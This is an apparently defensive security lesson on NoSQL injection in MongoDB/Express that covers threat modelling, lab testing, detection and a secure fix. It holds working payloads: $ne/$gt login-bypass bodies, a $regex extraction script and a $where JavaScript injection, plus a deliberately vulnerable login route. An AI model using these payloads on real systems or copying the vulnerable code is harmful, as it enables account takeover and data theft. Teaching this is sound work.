---
schema_version: 1
id: WEB-A05-NOSQL-INJECTION
title: "NoSQL Injection"
slug: nosql-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-943
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# NoSQL Injection

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain NoSQL Injection by root cause instead of just describing the consequences. 
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited. 
- Conduct controlled testing in a local lab and distinguish expected results from false positives. 
- Select root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the flow of HTTP request/response in the situation of NoSQL Injection and how to apply input handling across trust boundaries. 
- Distinguish between authentication, authorization, and validation. 
- Be able to read code/configuration in the language or framework appearing in the example. 
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

Many people often think that next-generation databases like MongoDB are completely safe from injection attacks because they do not use traditional commands. However, this is not entirely true. Instead of using text strings, MongoDB uses data objects to search and compare data, along with special operator characters starting with a dollar sign (for example: to compare equal, to compare not equal, or to compare greater than).

```javascript
// Normal MongoDB query in Node.js with Mongoose
const mongoose = require('mongoose');

// Find a user by email - standard query
const user = await User.findOne({ email: "alice@victim.lab.test" });

// Query with comparison operators
const activeUsers = await User.find({
    status: "active",
    age: { $gte: 18 }      // Age greater than or equal to 18
});

// Authentication query - find user matching both email AND password
const authUser = await User.findOne({
    email: userEmail,
    password: hashedPassword
});
```
Many developers believe that NoSQL databases are "immune" to injection because they do not use SQL strings. This is a **serious misconception** — NoSQL injection exploits a different mechanism: instead of inserting SQL syntax, an attacker inserts **query operators** into JSON objects.

## 4. Description and Root Cause

The NoSQL Injection vulnerability occurs when a "trusting" web application takes user input and directly inserts it into a MongoDB query without checking whether the data is a normal text string or an object containing MongoDB logical operators. An attacker can send a request containing the `$ne` operator (not equal) instead of a regular password. The application's authentication query will be transformed from "does the password match?" to "find users with a password that is not empty." As a result, the attacker can easily log in without knowing the password, bypass the authentication system, or probe and steal your entire database.

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** aggregated account and MongoDB document.  
- **Actor, authentication, and role:** anonymous sends JSON login/search; user role for update.  
- **Exploitation conditions:** object/operator is sent instead of scalar and then passed directly into the query.  
- **Browser, proxy, framework, and version:** MongoDB 7.x with Node.js 20/Express 4.x and JSON parser pinned; loopback; must store actual image/package version along with evidence.  
- **Mandatory evidence:** must link input with correlation ID, deciding control and impact on the correct asset; individual status code is not enough. [S1]

## 6. Attack Mechanism

For NoSQL injection, an object/operator is sent instead of a scalar and then passed directly into the query. The positive case must prove that the input reaches the correct sink and creates the described impact; the negative case, when native control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** start MongoDB 7.x with Node.js 20/Express 4.x and the JSON parser pinned; loopback; only load synthetic data, enable application/proxy/datastore logs, and attach ID correlation. 
2. **Baseline:** send a valid input for the NoSQL injection use case; record raw request/response, decide policy, and asset state before the test.
3. **Input and operation:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** consider a fixture vulnerable as positive only when logs prove the mechanism of “object/operator sent instead of scalar and then passed directly into the query”; secure fixtures must block before any side effect, and boundary inputs must fail closed.
5. **Cleanup:** delete NoSQL injection data, markers, and logs; revoke related session/cache, revert snapshot, and confirm no leftover test callbacks/processes.
6. **Safety limits:** only run on loopback/`.lab.test`; do not use targets, credentials, or real data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

### 1. Authentication Bypass

<!-- payload-id: WEB-A05-NOSQL-INJECTION-001 -->
<!-- context: Node.js 20.x + Express + MongoDB driver fixture; server-side query construction -->
<!-- prerequisites: loopback fixture with synthetic users; one baseline and one operator case; database snapshot -->
<!-- encoding: application/json UTF-8 parsed once; username/password must be strings in the secure schema -->
<!-- expected-result: code review identifies direct object-to-query flow; this block alone does not authenticate a user -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```javascript
// Vulnerable login endpoint
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,    // Directly from user input
        password: req.body.password     // Directly from user input
    });
    if (user) {
        res.json({ success: true, token: generateToken(user) });
    }
});
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-002 -->
<!-- context: MongoDB 7 login query receives $ne objects in both scalar credential fields -->
<!-- prerequisites: synthetic users only; one request; no real password/token returned -->
<!-- encoding: UTF-8 JSON with dollar-prefixed keys; Content-Length is generated from exact bytes by the harness -->
<!-- expected-result: vulnerable route returns the fixture success marker; schema validation rejects both objects before query -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /login HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 45

{"username":{"$ne":""},"password":{"$ne":""}}
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-003 -->
<!-- context: MongoDB 7 login query receives a $gt object for the password field -->
<!-- prerequisites: fixture-admin has a public nonempty marker value; one request; no token issuance -->
<!-- encoding: UTF-8 application/json; the harness computes Content-Length and preserves the $gt key -->
<!-- expected-result: vulnerable predicate matches fixture-admin; secure route rejects non-string password and logs no query -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /login HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 50

{"username":"fixture-admin","password":{"$gt":""}}
```

### 2. Data Extraction with $regex

<!-- payload-id: WEB-A05-NOSQL-INJECTION-004 -->
<!-- context: MongoDB 7 regex prefix oracle over a public four-character labCode field, not a password -->
<!-- prerequisites: loopback synthetic document; charset a-z0-9; maximum 144 requests; no account login or secret data -->
<!-- encoding: regex prefix is UTF-8 JSON and metacharacters are escaped except the intentional leading anchor -->
<!-- expected-result: bounded loop recovers only lab1 from the vulnerable fixture; secure schema disallows regex objects -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Probe the public synthetic labCode field character by character
POST /lab/oracle HTTP/1.1
Content-Type: application/json

{"record": "fixture", "labCode": {"$regex": "^l"}}       → 200 OK
{"record": "fixture", "labCode": {"$regex": "^la"}}      → 200 OK
{"record": "fixture", "labCode": {"$regex": "^lab"}}     → 200 OK
{"record": "fixture", "labCode": {"$regex": "^lab1"}}    → 200 OK
# Stop after recovering the documented four-character marker lab1.
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-005 -->
<!-- context: Python 3.12; loopback-only MongoDB oracle fixture with public marker lab1 -->
<!-- prerequisites: fixture bound to loopback; maximum 4 characters and 144 requests -->
<!-- encoding: requests serializes UTF-8 JSON; each prefix is regex-escaped before insertion after ^ -->
<!-- expected-result: recover at most four characters from the synthetic fixture secret, then stop -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Automated extraction script
import requests
import string

url = "http://127.0.0.1:8080/lab/oracle"
lab_code = ""
charset = string.ascii_lowercase + string.digits
max_length = 4
max_requests = max_length * len(charset)
request_count = 0

for _ in range(max_length):
    found = False
    for c in charset:
        if request_count >= max_requests:
            break
        request_count += 1
        payload = {
            "record": "fixture",
            "labCode": {"$regex": f"^{lab_code}{c}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            lab_code += c
            print(f"Found marker prefix: {lab_code}")
            found = True
            break
    if not found or request_count >= max_requests:
        break

print(f"Recovered public fixture marker: {lab_code}")
```

### 3. JavaScript Injection with $where

<!-- payload-id: WEB-A05-NOSQL-INJECTION-006 -->
<!-- context: MongoDB 7 fixture passes req.body.query as the complete find predicate with server-side JavaScript explicitly enabled; legacy $where behavior -->
<!-- prerequisites: isolated container with one synthetic document; exactly one request; server timeout below 500 ms -->
<!-- encoding: UTF-8 JSON parsed once; $where is a top-level operator inside query and Content-Length is 46 bytes for the exact minified body -->
<!-- expected-result: vulnerable route records one approximately 100 ms delay relative to its local baseline; secure route rejects $where before querying -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /api/users HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 46

{"query":{"$where":"sleep(100); return true"}}
```
`$where` is a query-level operator, not a valid operator under the field `username`. Timing is only evidence when compared to the baseline of the fixture itself and the application log confirms that the predicate has reached the query engine. [S1]

## 9. Vulnerable Code and Secure Code

```javascript
// ❌ VULNERABLE: Direct user input in MongoDB query
const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
    // req.body.password could be {"$ne": ""} instead of a string
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password   // No type checking!
    });
    if (user) return res.json({ token: createJWT(user) });
    res.status(401).json({ error: "Invalid credentials" });
});
```

```javascript
// ✅ SECURE: Reject non-scalar input and build the query on the server
const express = require('express');
const app = express();

app.use(express.json());

app.post('/login', async (req, res) => {
    // Reject arrays, objects and operator documents; never coerce them to strings.
    if (typeof req.body.username !== 'string' ||
        typeof req.body.password !== 'string') {
        return res.status(400).json({ error: "Invalid input" });
    }

    const username = req.body.username;
    const password = req.body.password;
    if (!username || !password || username.length > 64 || password.length > 128) {
        return res.status(400).json({ error: "Invalid input" });
    }

    // Use bcrypt comparison instead of DB-level password matching
    const user = await db.collection('users').findOne({ username });
    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    res.json({ token: createJWT(user) });
});
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to NoSQL Injection, the policy result, and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with the valid baseline and alert according to the behavior chain, not just one payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether it had any impact.
- Scanner or WAF alert is only an investigation signal; it is not the sole proof that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Validate schema/type scalars and construct predicates defined by the server, do not accept operators from the client. 
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before any side effect.

### Defense-in-depth

With NoSQL Injection, the following measures help reduce blast radius or increase detection capability. Rate limit, UUID unpredictability, WAF, CSP, or general validation should not be used as a substitute for original controls.

- **Summary**: Cast input data types, use secure query methods of ODM/ORM, and sanitize special operators.
- **Detailed steps**:
  - Validate input types: Cast user input to `String()` before using in queries.
  - Use ODM built-in sanitization: Mongoose schema with `type: String` automatically rejects objects.
  - Prohibit `$where`: Disable JavaScript execution in MongoDB config.
  - Use `mongo-sanitize`: Library that strips all keys starting with `$`.
  - Parameterized queries: Use Mongoose methods instead of raw MongoDB driver queries.
  - Rate limiting: Prevent automated extraction attacks.

## 12. Retest

- **Positive case:** with NoSQL Injection, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** the same input/resource but with an actor or context not allowed should be denied without leaking sensitive details.  
- **Boundary case:** test empty values, edge cases, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** verify that policy decisions, application logs, proxy logs, and datastore side effects match the correlation ID.  
- **Recheck:** save the minimal scenario that reproduces the old error and prove that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of NoSQL Injection without confirming side effects and logs. 
- Use a payload with correct syntax but the wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as fixed by another original control. 
- Only fix one route while the same sink/policy is used in another route. 
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **NoSQL Injection**: Injecting a malicious query operator into the NoSQL search statement.
- **JSON/BSON**: Key-value pair data representation formats used in the NoSQL database.
- **Query Operator**: Special operators (such as `$ne`, `$gt`, `$regex`) used to filter and query data.
- **Object Parser**: A tool that analyzes and transforms input data strings into programming objects.
- **Authentication Bypass**: Circumventing login verification mechanisms to access accounts without authorization.

## 16. Related Lessons and Further Reading

- [SQL Injection](../sql-injection/) — Classic SQL Injection vulnerability on relational databases SQL.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/nosql-injection — version/status: current version; accessed: 2026-07-17.  
- **[S2]** HackTricks – NoSQL Injection. https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html — version/status: current version; accessed: 2026-07-17.  
- **[S3]** CWE-943. https://cwe.mitre.org/data/definitions/943.html — version/status: current version; accessed: 2026-07-17.  
- **[S4]** OWASP Testing Guide – NoSQL Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection — version/status: current version; accessed: 2026-07-17.  
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.